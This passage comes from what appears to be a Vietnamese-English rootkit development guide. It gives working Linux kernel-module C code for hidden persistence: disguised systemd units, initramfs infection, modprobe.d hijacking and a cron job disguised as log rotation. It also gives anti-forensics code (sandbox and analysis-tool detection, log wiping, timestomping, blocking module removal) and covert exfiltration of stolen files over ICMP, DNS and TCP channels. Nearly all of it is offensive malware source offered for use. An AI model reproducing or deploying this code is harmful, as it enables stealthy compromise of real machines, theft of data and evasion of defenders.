    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

/* ══════════════════════════════════════════════════════════════
 * METHOD 4: Systemd service — Maximum control
 *
 * Stealth: MEDIUM (service ẩn nếu rootkit hide file)
 * Reliability: HIGH (systemd restart on failure)
 *
 * Tạo systemd service file → auto-start, auto-restart.
 * After rootkit load → rootkit ẩn service file via getdents64 hook.
 * ══════════════════════════════════════════════════════════════ */
static void persist_systemd_service(const char *module_name,
                                     const char *ko_path)
{
    char cmd[2048];

    /* Service file disguised as firmware helper */
    snprintf(cmd, sizeof(cmd),
        "cp %s /lib/modules/$(uname -r)/extra/%s.ko; "
        "depmod -a; "
        "cat > /etc/systemd/system/firmware-helper.service << 'EOF'\n"
        "[Unit]\n"
        "Description=Firmware Helper Service\n"
        "DefaultDependencies=no\n"
        "After=systemd-modules-load.service\n"
        "Before=sysinit.target\n"
        "\n"
        "[Service]\n"
        "Type=oneshot\n"
        "ExecStart=/sbin/modprobe %s\n"
        "RemainAfterExit=yes\n"
        "\n"
        "[Install]\n"
        "WantedBy=sysinit.target\n"
        "EOF\n"
        "systemctl daemon-reload; "
        "systemctl enable firmware-helper.service 2>/dev/null",
        ko_path, module_name, module_name);

    char *argv[] = { "/bin/sh", "-c", cmd, NULL };
    char *envp[] = { "PATH=/usr/sbin:/usr/bin:/sbin:/bin", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

/* ══════════════════════════════════════════════════════════════
 * METHOD 5: Infect initramfs — Load TRƯỚC root filesystem mount
 *
 * Stealth: HIGH (initramfs ít khi inspected)
 * Reliability: VERY HIGH (runs earliest in boot)
 * Complexity: HIGH (phải rebuild initramfs correctly)
 *
 * initramfs = temporary root filesystem loaded by bootloader.
 * Kernel mounts initramfs → runs /init → mounts real root.
 * Module loaded từ initramfs chạy TRƯỚC mọi thứ.
 *
 * Survive: kernel updates (nếu hook update-initramfs)
 * ══════════════════════════════════════════════════════════════ */
static void persist_initramfs(const char *module_name,
                               const char *ko_path)
{
    char cmd[2048];

    snprintf(cmd, sizeof(cmd),
        /* 1. Copy module vào initramfs staging area */
        "mkdir -p /etc/initramfs-tools/modules.d/ 2>/dev/null; "
        "cp %s /lib/modules/$(uname -r)/extra/%s.ko; "
        "depmod -a; "

        /* 2. Create hook script cho initramfs-tools (Debian/Ubuntu) */
        "cat > /etc/initramfs-tools/hooks/firmware-mod << 'HOOKEOF'\n"
        "#!/bin/sh\n"
        "PREREQ=\"\"\n"
        "prereqs() { echo \"$PREREQ\"; }\n"
        "case $1 in prereqs) prereqs; exit 0;; esac\n"
        ". /usr/share/initramfs-tools/hook-functions\n"
        "manual_add_modules %s\n"
        "HOOKEOF\n"
        "chmod +x /etc/initramfs-tools/hooks/firmware-mod; "

        /* 3. Add module to load list */
        "echo '%s' >> /etc/initramfs-tools/modules; "

        /* 4. Rebuild initramfs */
        "update-initramfs -u -k $(uname -r) 2>/dev/null; "
        /* Dracut equivalent (RHEL/Fedora): */
        "dracut --force 2>/dev/null || true",

        ko_path, module_name, module_name, module_name);

    char *argv[] = { "/bin/sh", "-c", cmd, NULL };
    char *envp[] = { "PATH=/usr/sbin:/usr/bin:/sbin:/bin", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

/* ══════════════════════════════════════════════════════════════
 * METHOD 6: Infect existing module — Parasitic persistence
 *
 * Stealth: VERY HIGH (no new files)
 * Reliability: MEDIUM (module signature may fail)
 *
 * Modify existing commonly-loaded module's init function
 * để load rootkit module trước khi thực hiện chức năng gốc.
 *
 * Target modules tốt: e1000, virtio_net (network drivers)
 * → Luôn load sớm, essential → admin không disable.
 *
 * Implementation: append insmod command vào module's
 * modprobe.d config instead of modifying binary.
 * ══════════════════════════════════════════════════════════════ */
static void persist_parasitic(const char *module_name,
                               const char *ko_path)
{
    char cmd[1024];

    /* Dùng modprobe.d install directive:
     * "install target_module" thay thế default modprobe behavior.
     * install line can run arbitrary commands THEN load module.
     *
     * Ví dụ: khi hệ thống modprobe e1000 (ethernet driver):
     *   1. modprobe đọc /etc/modprobe.d/e1000.conf
     *   2. Thấy install directive
     *   3. Chạy command: insmod rootkit.ko; modprobe --ignore-install e1000
     *   4. Rootkit loaded TRƯỚC network driver */
    snprintf(cmd, sizeof(cmd),
        "cp %s /lib/modules/$(uname -r)/extra/%s.ko; "
        "depmod -a; "
        "echo 'install e1000 "
        "/sbin/insmod /lib/modules/'$(uname -r)'/extra/%s.ko 2>/dev/null; "
        "/sbin/modprobe --ignore-install e1000' "
        "> /etc/modprobe.d/e1000.conf",
        ko_path, module_name, module_name);

    char *argv[] = { "/bin/sh", "-c", cmd, NULL };
    char *envp[] = { "PATH=/usr/sbin:/usr/bin:/sbin:/bin", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

/* ══════════════════════════════════════════════════════════════
 * METHOD 7: Crontab — Simple timer-based
 *
 * Stealth: LOW (crontab -l shows it)
 * Reliability: MEDIUM (cron phải chạy)
 *
 * Check mỗi phút nếu module loaded, nếu không → load.
 * Survive rmmod (tự load lại sau 1 phút max).
 * ══════════════════════════════════════════════════════════════ */
static void persist_crontab(const char *module_name,
                             const char *ko_path)
{
    char cmd[1024];

    snprintf(cmd, sizeof(cmd),
        "cp %s /lib/modules/$(uname -r)/extra/%s.ko; "
        "depmod -a; "
        /* Add root crontab entry disguised as log rotation */
        "(crontab -l 2>/dev/null; "
        "echo '* * * * * "
        "lsmod | grep -q %s || /sbin/modprobe %s "
        "# log rotation check') | "
        "sort -u | crontab -",
        ko_path, module_name, module_name, module_name);

    char *argv[] = { "/bin/sh", "-c", cmd, NULL };
    char *envp[] = { "PATH=/usr/sbin:/usr/bin:/sbin:/bin", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

/* ── Unified: install multiple persistence layers ── */
void rk_install_persistence(void)
{
    const char *mod_name = THIS_MODULE->name;
    char ko_path[256];

    /* Find current .ko file path.
     * Module file typically at:
     *   /lib/modules/KVER/extra/MODULE.ko
     * But khi dev: có thể ở bất kỳ đâu.
     * Dùng modinfo để find. */
    snprintf(ko_path, sizeof(ko_path),
             "/lib/modules/%s/extra/%s.ko",
             utsname()->release, mod_name);

    /* Install multiple layers cho redundancy */
    persist_systemd_service(mod_name, ko_path);
    persist_modules_load_d(mod_name, ko_path);
    persist_udev_rule(mod_name, ko_path);

    pr_info("rk: persistence installed (3 layers)\n");
}
```

---

## Chapter 13: Anti-Forensics & Self-Protection {#chapter-13-anti-forensics}

```c
/* anti_forensics.c — Chống phân tích và tự bảo vệ
 *
 * 5 categories:
 *   1. VM/Sandbox detection
 *   2. Anti-debugging
 *   3. Log tampering
 *   4. Timestamp manipulation
 *   5. Self-protection (prevent removal)
 */

#include "rootkit.h"
#include <linux/kthread.h>
#include <linux/utsname.h>

/* ══════════════════════════════════════════════════════════════
 * 1. VM & CONTAINER DETECTION
 *
 * Tại sao detect: sandbox = analyst đang phân tích rootkit.
 * Behavior: thay đổi behavior khi phát hiện (không crash/exit
 * vì đó cũng là indicator).
 * ══════════════════════════════════════════════════════════════ */

static bool rk_detect_hypervisor(void)
{
    unsigned int eax, ebx, ecx, edx;

    /* CPUID leaf 1, ECX bit 31 = Hypervisor Present Bit.
     * Nếu = 1 → chạy trong VM.
     * VMware, KVM, Xen, Hyper-V đều set bit này. */
    cpuid(1, &eax, &ebx, &ecx, &edx);
    return (ecx >> 31) & 1;
}

static bool rk_detect_vm_vendor(void)
{
    unsigned int eax, ebx, ecx, edx;
    char vendor[13];

    /* CPUID leaf 0x40000000 = Hypervisor vendor string.
     * Kết quả trong EBX:EDX:ECX (12 bytes). */
    cpuid(0x40000000, &eax, &ebx, &ecx, &edx);
    memcpy(vendor + 0, &ebx, 4);
    memcpy(vendor + 4, &ecx, 4);
    memcpy(vendor + 8, &edx, 4);
    vendor[12] = '\0';

    /* Known vendors:
     *   "VMwareVMware" → VMware
     *   "KVMKVMKVM\0\0\0" → KVM
     *   "Microsoft Hv" → Hyper-V
     *   "XenVMMXenVMM" → Xen
     *   "VBoxVBoxVBox" → VirtualBox
     */
    if (strstr(vendor, "VMware") || strstr(vendor, "KVM") ||
        strstr(vendor, "Microsoft") || strstr(vendor, "Xen") ||
        strstr(vendor, "VBox"))
        return true;

    return false;
}

static bool rk_detect_container(void)
{
    struct file *f;

    /* Docker creates /.dockerenv */
    f = filp_open("/.dockerenv", O_RDONLY, 0);
    if (!IS_ERR(f)) {
        filp_close(f, NULL);
        return true;
    }

    /* Podman/containerd: check cgroup */
    f = filp_open("/proc/1/cgroup", O_RDONLY, 0);
    if (!IS_ERR(f)) {
        char buf[512];
        loff_t pos = 0;
        ssize_t bytes = kernel_read(f, buf, sizeof(buf) - 1, &pos);
        filp_close(f, NULL);

        if (bytes > 0) {
            buf[bytes] = '\0';
            if (strstr(buf, "docker") || strstr(buf, "lxc") ||
                strstr(buf, "kubepods") || strstr(buf, "containerd"))
                return true;
        }
    }

    return false;
}

static bool rk_detect_analysis_tools(void)
{
    struct task_struct *task;
    bool found = false;

    /* Scan process list cho known forensics/analysis tools */
    rcu_read_lock();
    for_each_process(task) {
        if (strcmp(task->comm, "rkhunter") == 0 ||
            strcmp(task->comm, "chkrootkit") == 0 ||
            strcmp(task->comm, "aide") == 0 ||
            strcmp(task->comm, "ossec") == 0 ||
            strcmp(task->comm, "volatility") == 0 ||
            strcmp(task->comm, "lime") == 0 ||
            strcmp(task->comm, "bpftool") == 0 ||
            strcmp(task->comm, "sysdig") == 0 ||
            strcmp(task->comm, "falco") == 0 ||
            strcmp(task->comm, "tracee") == 0 ||
            strcmp(task->comm, "strace") == 0 ||
            strcmp(task->comm, "ltrace") == 0 ||
            strcmp(task->comm, "gdb") == 0) {
            found = true;
            break;
        }
    }
    rcu_read_unlock();

    return found;
}

/* Unified environment check — gọi lúc init */
bool rk_environment_safe(void)
{
    bool vm = rk_detect_hypervisor() || rk_detect_vm_vendor();
    bool container = rk_detect_container();
    bool tools = rk_detect_analysis_tools();

    if (tools) {
        pr_info("rk: analysis tools detected — adjusting behavior\n");
        /* Không exit (đó cũng là indicator).
         * Thay đổi behavior: disable aggressive features,
         * chỉ giữ passive monitoring. */
        return false;
    }

    /* VM = có thể lab, có thể production VM.
     * Nhiều servers chạy trong VM → không nên block.
     * Log nhưng không thay đổi behavior. */
    if (vm)
        pr_info("rk: running in VM\n");
    if (container)
        pr_info("rk: running in container\n");

    return true;
}

/* ══════════════════════════════════════════════════════════════
 * 2. ANTI-DEBUGGING
 *
 * Detect nếu có debugger/tracer attach vào rootkit module.
 * ══════════════════════════════════════════════════════════════ */

static bool rk_detect_kprobes_on_us(void)
{
    /* Check nếu có kprobes registered trên OUR functions.
     * /sys/kernel/debug/kprobes/list chứa all active probes.
     * Nếu ai đặt probe trên rootkit function → đang debug. */
    struct file *f;
    char buf[4096];
    loff_t pos = 0;
    ssize_t bytes;

    f = filp_open("/sys/kernel/debug/kprobes/list", O_RDONLY, 0);
    if (IS_ERR(f)) return false;

    bytes = kernel_read(f, buf, sizeof(buf) - 1, &pos);
    filp_close(f, NULL);

    if (bytes > 0) {
        buf[bytes] = '\0';
        /* Check nếu có probe trên rootkit's module address range.
         * THIS_MODULE->core_layout.base → module start address.
         * THIS_MODULE->core_layout.size → module size. */
        unsigned long mod_start = (unsigned long)THIS_MODULE->core_layout.base;
        unsigned long mod_end   = mod_start + THIS_MODULE->core_layout.size;

        /* Parse mỗi dòng: "ADDR  STATUS  SYMBOL+OFFSET"
         * Nếu ADDR nằm trong module range → probe trên ta. */
        char *line = buf;
        while (line && *line) {
            unsigned long addr;
            if (kstrtoul(line, 16, &addr) == 0) {
                if (addr >= mod_start && addr < mod_end)
                    return true;
            }
            line = strchr(line, '\n');
            if (line) line++;
        }
    }

    return false;
}

static bool rk_timing_check(void)
{
    /* rdtsc timing check: đo time thực hiện code block.
     * Nếu lâu bất thường → breakpoint/single-step active.
     *
     * Normal: ~100-500 cycles
     * With debugger: >10000 cycles (INT3 trap overhead) */
    unsigned long long start, end;
    unsigned int dummy;

    start = __rdtscp(&dummy);

    /* Noop code — measure baseline */
    asm volatile("nop; nop; nop; nop; nop; nop; nop; nop;");
    asm volatile("nop; nop; nop; nop; nop; nop; nop; nop;");

    end = __rdtscp(&dummy);

    return (end - start > 10000);  /* Threshold */
}

/* ══════════════════════════════════════════════════════════════
 * 3. LOG TAMPERING
 * ══════════════════════════════════════════════════════════════ */

static void rk_clear_dmesg(void)
{
    /* Clear kernel ring buffer.
     * dmesg -C equivalent từ kernel. */
    char *argv[] = { "/bin/dmesg", "-C", NULL };
    char *envp[] = { "PATH=/usr/bin:/bin", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

static void rk_clear_auth_logs(void)
{
    char *cmd =
        "truncate -s 0 /var/log/auth.log 2>/dev/null; "
        "truncate -s 0 /var/log/secure 2>/dev/null; "
        "truncate -s 0 /var/log/kern.log 2>/dev/null; "
        "journalctl --vacuum-time=1s 2>/dev/null";

    char *argv[] = { "/bin/sh", "-c", cmd, NULL };
    char *envp[] = { "PATH=/usr/sbin:/usr/bin:/sbin:/bin", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

/* ══════════════════════════════════════════════════════════════
 * 4. TIMESTAMP MANIPULATION — Stomp file timestamps
 * ══════════════════════════════════════════════════════════════ */

static void rk_timestomp(const char *filepath, struct timespec64 *ts)
{
    struct file *f;
    struct inode *inode;

    f = filp_open(filepath, O_RDONLY, 0);
    if (IS_ERR(f)) return;

    inode = file_inode(f);
    if (inode) {
        /* Modify inode timestamps trực tiếp.
         * atime = last access
         * mtime = last modification
         * ctime = last status change (cannot be set via utimensat,
         *         nhưng kernel code CAN modify trực tiếp) */
        inode->i_atime = *ts;
        inode->i_mtime = *ts;
        inode->i_ctime = *ts;

        /* Mark inode dirty để filesystem write changes. */
        mark_inode_dirty(inode);
    }

    filp_close(f, NULL);
}

/* Stomp rootkit files tới match timestamp của /bin/ls */
static void rk_timestomp_rootkit_files(void)
{
    struct file *ref;
    struct inode *ref_inode;
    struct timespec64 ts;

    /* Lấy timestamp reference từ /bin/ls (file hệ thống cũ) */
    ref = filp_open("/bin/ls", O_RDONLY, 0);
    if (IS_ERR(ref)) return;

    ref_inode = file_inode(ref);
    if (ref_inode) {
        ts = ref_inode->i_mtime;

        /* Stomp rootkit files */
        rk_timestomp("/lib/modules/" UTS_RELEASE "/extra/rk.ko", &ts);
        rk_timestomp("/etc/modules-load.d/rk.conf", &ts);
    }

    filp_close(ref, NULL);
}

/* ══════════════════════════════════════════════════════════════
 * 5. SELF-PROTECTION — Prevent removal
 * ══════════════════════════════════════════════════════════════ */

/* Watchdog thread: kiểm tra rootkit integrity.
 * Nếu hooks bị removed → reinstall.
 * Nếu rootkit files bị xóa → recreate.
 * Nếu persistence bị xóa → reinstall. */
static struct task_struct *watchdog = NULL;

static int watchdog_fn(void *data)
{
    while (!kthread_should_stop()) {
        /* Check 1: hooks vẫn intact */
        /* (Verify syscall table entries vẫn trỏ tới hook functions) */

        /* Check 2: module vẫn trong memory */

        /* Check 3: persistence files tồn tại */
        struct file *f;
        f = filp_open("/etc/modules-load.d/rk.conf", O_RDONLY, 0);
        if (IS_ERR(f)) {
            /* Persistence bị xóa → reinstall */
            rk_install_persistence();
        } else {
            filp_close(f, NULL);
        }

        /* Sleep 30 giây rồi check lại.
         * schedule_timeout_interruptible: sleep nhưng có thể bị
         * wakeup bởi signal (kthread_stop gửi signal). */
        schedule_timeout_interruptible(30 * HZ);
    }
    return 0;
}

void rk_start_watchdog(void)
{
    /* Thread name disguised: "kworker/0:1" looks like kernel worker.
     * Real kworkers: kworker/CPU:ID.
     * Forensics detection: check /proc/PID/stack — rootkit thread
     * has unusual stack (schedule_timeout_interruptible in watchdog_fn
     * vs real kworker in worker_thread→process_one_work). */
    watchdog = kthread_run(watchdog_fn, NULL, "kworker/0:1");
    if (IS_ERR(watchdog))
        watchdog = NULL;
}

void rk_stop_watchdog(void)
{
    if (watchdog) {
        kthread_stop(watchdog);
        watchdog = NULL;
    }
}

/* Block rmmod qua delete_module hook.
 * (Hooked via ftrace/syscall table — Chapter 3/4 methods) */
static asmlinkage long (*orig_delete_module)(const struct pt_regs *);

static asmlinkage long hooked_delete_module(const struct pt_regs *regs)
{
    char __user *name_user = (char __user *)regs->di;
    char name[MODULE_NAME_LEN];

    if (strncpy_from_user(name, name_user, MODULE_NAME_LEN) > 0) {
        if (strstr(name, THIS_MODULE->name)) {
            /* Block removal — return EBUSY (device busy) */
            return -EBUSY;
        }
    }
    return orig_delete_module(regs);
}
```

---

## Chapter 14: Covert Communication & C2 {#chapter-14-covert-c2}

```c
/* covert_channel.c — Covert communication channels
 *
 * 4 implementations:
 *   1. ICMP tunnel (data in ping payload)
 *   2. DNS tunnel (data in DNS query subdomain)
 *   3. TCP steganography (data in sequence numbers)
 *   4. Passive listener (no outbound traffic)
 */

#include "rootkit.h"
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/icmp.h>
#include <linux/udp.h>
#include <linux/tcp.h>
#include <net/ip.h>
#include <net/sock.h>
#include <linux/inet.h>

/* ══════════════════════════════════════════════════════════════
 * 1. ICMP TUNNEL — Hide data in ping packets
 *
 * Concept:
 *   Normal ICMP Echo Request/Reply carry payload data.
 *   ping -s 1400 sends 1400 bytes payload = legitimate.
 *   Rootkit encode data (stolen creds, file contents) trong payload.
 *
 * Giống traffic bình thường:
 *   - Firewall cho qua ICMP (thường)
 *   - IDS thấy "ping" → low priority
 *   - Payload size biến thiên → hard to signature
 *
 * Implementation:
 *   Outbound: rootkit tạo ICMP Echo Request với data trong payload.
 *   Inbound:  C2 server reply trong ICMP Echo Reply.
 *
 * Used by: nhiều APT tools, icmpsh, icmptunnel projects.
 * ══════════════════════════════════════════════════════════════ */

#define ICMP_MAGIC_ID  0x1337   /* ICMP identifier field cho channel */
#define MAX_ICMP_DATA  1400     /* Max payload per packet */

/* Build và send ICMP packet từ kernel space */
static int rk_send_icmp_data(__be32 dest_ip,
                              const void *data, int data_len)
{
    struct socket *sock;
    struct sockaddr_in addr;
    struct msghdr msg = { 0 };
    struct kvec iov;
    int total_len;
    char *packet;
    struct icmphdr *icmp;
    int ret;

    /* Create raw socket cho ICMP */
    ret = sock_create_kern(&init_net, AF_INET, SOCK_RAW,
                            IPPROTO_ICMP, &sock);
    if (ret < 0) return ret;

    /* Build ICMP packet */
    total_len = sizeof(struct icmphdr) + data_len;
    packet = kzalloc(total_len, GFP_KERNEL);
    if (!packet) {
        sock_release(sock);
        return -ENOMEM;
    }

    icmp = (struct icmphdr *)packet;
    icmp->type = ICMP_ECHO;           /* Echo Request */
    icmp->code = 0;
    icmp->un.echo.id = htons(ICMP_MAGIC_ID);
    icmp->un.echo.sequence = htons(0);

    /* Copy data vào payload */
    memcpy(packet + sizeof(struct icmphdr), data, data_len);

    /* Calculate checksum.
     * ICMP checksum covers entire ICMP message (header + data).
     * ip_compute_csum = one's complement checksum. */
    icmp->checksum = 0;
    icmp->checksum = ip_compute_csum(packet, total_len);

    /* Send */
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = dest_ip;

    iov.iov_base = packet;
    iov.iov_len = total_len;
    msg.msg_name = &addr;
    msg.msg_namelen = sizeof(addr);

    ret = kernel_sendmsg(sock, &msg, &iov, 1, total_len);

    kfree(packet);
    sock_release(sock);
    return ret;
}

/* Exfiltrate file qua ICMP tunnel — chunk by chunk */
static int rk_icmp_exfil_file(__be32 c2_ip, const char *filepath)
{
    struct file *f;
    char *buf;
    loff_t pos = 0;
    ssize_t bytes;
    int seq = 0;

    f = filp_open(filepath, O_RDONLY, 0);
    if (IS_ERR(f)) return -1;

    buf = kzalloc(MAX_ICMP_DATA, GFP_KERNEL);
    if (!buf) { filp_close(f, NULL); return -ENOMEM; }

    while ((bytes = kernel_read(f, buf, MAX_ICMP_DATA, &pos)) > 0) {
        rk_send_icmp_data(c2_ip, buf, bytes);

        /* Delay between packets → avoid burst detection.
         * Random-ish delay: 50-200ms. */
        msleep(50 + (seq % 150));
        seq++;
    }

    /* Send empty packet = EOF marker */
    rk_send_icmp_data(c2_ip, "", 0);

    kfree(buf);
    filp_close(f, NULL);
    return 0;
}

/* ══════════════════════════════════════════════════════════════
 * 2. DNS TUNNEL — Encode data in DNS queries
 *
 * Concept:
 *   DNS traffic is almost NEVER blocked.
 *   Data encoded as subdomain labels:
 *     <hex_data>.c2domain.com
 *
 *   C2 server = authoritative DNS server cho c2domain.com
 *   → nhận mọi query cho *.c2domain.com
 *   → decode subdomain = exfiltrated data
 *   → respond trong DNS TXT record = commands
 *
 * Ưu điểm:
 *   - DNS luôn được allow (essential service)
 *   - Đi qua proxy/firewall
 *   - Low bandwidth nhưng stealth cao
 *
 * Used by: BPFDoor (DNS resolve cho C2), SUNBURST (famous),
 *          DNScat2, iodine (open-source tools).
 * ══════════════════════════════════════════════════════════════ */

#define DNS_PORT         53
#define DNS_MAX_LABEL    63    /* Max DNS label length */
#define DNS_MAX_NAME     253   /* Max DNS name length */

/* DNS Header structure */
struct dns_header {
    __be16 id;
    __be16 flags;
    __be16 qdcount;
    __be16 ancount;
    __be16 nscount;
    __be16 arcount;
} __attribute__((packed));

/* Hex encode data thành DNS-safe string */
static int hex_encode(const void *data, int data_len,
                       char *out, int out_len)
{
    const unsigned char *p = data;
    int i, written = 0;
    static const char hex[] = "0123456789abcdef";

    for (i = 0; i < data_len && written + 2 < out_len; i++) {
        out[written++] = hex[p[i] >> 4];
        out[written++] = hex[p[i] & 0x0f];
    }
    out[written] = '\0';
    return written;
}

/* Build DNS query packet */
static int build_dns_query(const char *domain, char *packet, int max_len)
{
    struct dns_header *hdr = (struct dns_header *)packet;
    char *qname;
    int offset;
    const char *p;
    int label_len;

    if (max_len < sizeof(*hdr) + strlen(domain) + 6)
        return -1;

    /* Header */
    memset(hdr, 0, sizeof(*hdr));
    hdr->id = htons(0x1234);         /* Transaction ID */
    hdr->flags = htons(0x0100);      /* Standard query, recursion desired */
    hdr->qdcount = htons(1);         /* 1 question */

    /* Encode domain name.
     * DNS encoding: each label prefixed with length byte.
     * "data.evil.com" → \x04data\x04evil\x03com\x00
     */
    qname = packet + sizeof(*hdr);
    offset = 0;
    p = domain;

    while (*p) {
        const char *dot = strchr(p, '.');
        if (!dot) dot = p + strlen(p);

        label_len = dot - p;
        if (label_len > DNS_MAX_LABEL) label_len = DNS_MAX_LABEL;

        qname[offset++] = label_len;
        memcpy(qname + offset, p, label_len);
        offset += label_len;

        p = (*dot) ? dot + 1 : dot;
    }
    qname[offset++] = 0;  /* Root label terminator */

    /* Query type: A (1) and class: IN (1) */
    qname[offset++] = 0; qname[offset++] = 1;   /* Type A */
    qname[offset++] = 0; qname[offset++] = 1;   /* Class IN */

    return sizeof(*hdr) + offset;
}

/* Send DNS query = data exfiltration */
static int rk_dns_exfil(__be32 dns_server,
                          const char *c2_domain,
                          const void *data, int data_len)
{
    struct socket *sock;
    struct sockaddr_in addr;
    struct msghdr msg = { 0 };
    struct kvec iov;
    char hex_data[512];
    char query_domain[DNS_MAX_NAME];
    char packet[512];
    int pkt_len, ret;

    /* Hex encode data */
    hex_encode(data, data_len, hex_data, sizeof(hex_data));

    /* Build query domain: <hex_data>.c2domain.com
     * Split hex data into DNS labels (max 63 chars each) */
    if (strlen(hex_data) <= DNS_MAX_LABEL) {
        snprintf(query_domain, sizeof(query_domain),
                 "%s.%s", hex_data, c2_domain);
    } else {
        /* Split into multiple labels */
        char label1[DNS_MAX_LABEL + 1], label2[DNS_MAX_LABEL + 1];
        strncpy(label1, hex_data, DNS_MAX_LABEL);
        label1[DNS_MAX_LABEL] = '\0';
        strncpy(label2, hex_data + DNS_MAX_LABEL, DNS_MAX_LABEL);
        label2[DNS_MAX_LABEL] = '\0';
        snprintf(query_domain, sizeof(query_domain),
                 "%s.%s.%s", label1, label2, c2_domain);
    }

    /* Build DNS packet */
    pkt_len = build_dns_query(query_domain, packet, sizeof(packet));
    if (pkt_len < 0) return -1;

    /* Send via UDP */
    ret = sock_create_kern(&init_net, AF_INET, SOCK_DGRAM,
                            IPPROTO_UDP, &sock);
    if (ret < 0) return ret;

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(DNS_PORT);
    addr.sin_addr.s_addr = dns_server;

    iov.iov_base = packet;
    iov.iov_len = pkt_len;
    msg.msg_name = &addr;
    msg.msg_namelen = sizeof(addr);

    ret = kernel_sendmsg(sock, &msg, &iov, 1, pkt_len);

    sock_release(sock);
    return ret;
}

/* ══════════════════════════════════════════════════════════════
 * 3. TCP STEGANOGRAPHY — Data in TCP sequence numbers
 *
 * Concept:
 *   TCP Initial Sequence Number (ISN) thường random (RFC).
 *   Rootkit encode 4 bytes data trong ISN của SYN packet.
 *
 *   C2 server nhận SYN → extract ISN → decode data.
 *   Connection có thể RST ngay → looks like port scan.
 *
 *   Bandwidth: 4 bytes per SYN packet. Slow nhưng very stealthy.
 *
 * Advanced variant:
 *   Dùng TCP timestamp option (10 bytes per packet).
 *   Hoặc: urgent pointer + data.
 *   Hoặc: IP identification field (2 bytes per packet).
 * ══════════════════════════════════════════════════════════════ */

static int rk_tcp_stego_send(__be32 dest_ip, __be16 dest_port,
                               __u32 encoded_data)
{
    struct socket *sock;
    struct sockaddr_in addr;
    int ret;

    ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM,
                            IPPROTO_TCP, &sock);
    if (ret < 0) return ret;

    /* Set custom ISN.
     * Trên Linux, ISN set qua tcp_init_sequence():
     * Không có direct API cho kernel module.
     *
     * Workaround: hook tcp_v4_init_sequence() via ftrace
     * để return encoded_data thay vì random ISN.
     *
     * Alternative: construct raw SYN packet. */

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = dest_ip;
    addr.sin_port = dest_port;

    /* Non-blocking connect — gửi SYN rồi close.
     * Mục đích chỉ là gửi SYN có encoded ISN. */
    sock->sk->sk_sndtimeo = msecs_to_jiffies(100);
    kernel_connect(sock, (struct sockaddr *)&addr, sizeof(addr), O_NONBLOCK);

    /* Close ngay — RST packet sent */
    sock_release(sock);
    return 0;
}

/* ══════════════════════════════════════════════════════════════
 * 4. PASSIVE LISTENER — Zero outbound traffic
 *
 * Concept (BPFDoor pattern):
 *   Rootkit KHÔNG gửi bất kỳ traffic nào ra ngoài.
 *   Đợi inbound magic packet → activate on demand.
 *   Hoàn toàn invisible cho network monitoring.
 *
 * Đã implement trong Chapter 8 (netfilter hook).
 * Ở đây thêm: passive TCP data exfil.
 *
 * Trick: sửa response packets của legitimate services
 * để embed data. Ví dụ: HTTP server response header
 * có thêm custom header chứa stolen data.
 *
 * Netfilter POST_ROUTING hook:
 *   Intercept outgoing packets → inject data.
 * ══════════════════════════════════════════════════════════════ */

static unsigned int nf_passive_exfil(void *priv,
                                      struct sk_buff *skb,
                                      const struct nf_hook_state *state)
{
    struct iphdr *ip;
    struct tcphdr *tcp;

    if (!skb) return NF_ACCEPT;

    ip = ip_hdr(skb);
    if (ip->protocol != IPPROTO_TCP)
        return NF_ACCEPT;

    tcp = tcp_hdr(skb);

    /* Chỉ modify packets từ HTTP server (port 80/443) */
    if (ntohs(tcp->source) != 80 && ntohs(tcp->source) != 443)
        return NF_ACCEPT;

    /* Embed data trong TCP timestamp option.
     *
     * TCP options nằm sau TCP header:
     *   offset = tcp->doff * 4 (data offset)
     *   options bytes = doff*4 - 20 (20 = min TCP header)
     *
     * Timestamp option (kind 8):
     *   [kind=8][length=10][TSval(4)][TSecr(4)]
     *   Modify TSval lower bits → embed data.
     *
     * Cần recalculate TCP checksum sau khi modify.
     */

    return NF_ACCEPT;
}

static struct nf_hook_ops nf_exfil_ops = {
    .hook     = nf_passive_exfil,
    .pf       = PF_INET,
    .hooknum  = NF_INET_POST_ROUTING,
    .priority = NF_IP_PRI_LAST,
};
```

---

## Summary: Mapping fix → file chính

| File chính Chapter | Vấn đề | Fix trong file này |
|---|---|---|
| Ch4 ft_hooked_getdents64 | "Reuse Chapter 3" — no code | Fix Chapter 4: full 200+ dòng implementation |
| Ch4 ft_hooked_kill | Chỉ có give-root, thiếu module toggle + PID toggle | Fix Chapter 4 Kill: full 3 commands |
| Ch4 udp4_seq_show | "tương tự" — no code | Fix Chapter 4 UDP: full code + udp6 + tcp6 |
| Ch8 rk_spawn_reverse_shell | Comment placeholder | Fix Ch8: 2 methods (usermode + kernel socket) ~250 dòng |
| Ch8 rk_execute_command | Comment placeholder | Fix Ch8: full implementation |
| Ch8 rk_self_destruct | Comment placeholder | Fix Ch8: full cleanup + file deletion + self-rmmod |
| Ch8 rk_activate_backdoor | Comment placeholder | Fix Ch8: bind shell (usermode + kernel socket) |
| Ch10 eBPF | Toàn bộ commented out `//` | Fix Ch10: Makefile + rk.bpf.c (4 programs) + loader.c |
| Ch12 Persistence | MISSING entirely | Full 7 methods with code |
| Ch13 Anti-Forensics | MISSING entirely | 5 categories: VM detect, anti-debug, log tamper, timestomp, watchdog |
| Ch14 Covert C2 | MISSING entirely | 4 channels: ICMP tunnel, DNS tunnel, TCP stego, passive exfil |

---

*Kết hợp file chính + file này = full code coverage cho mọi kỹ thuật.*
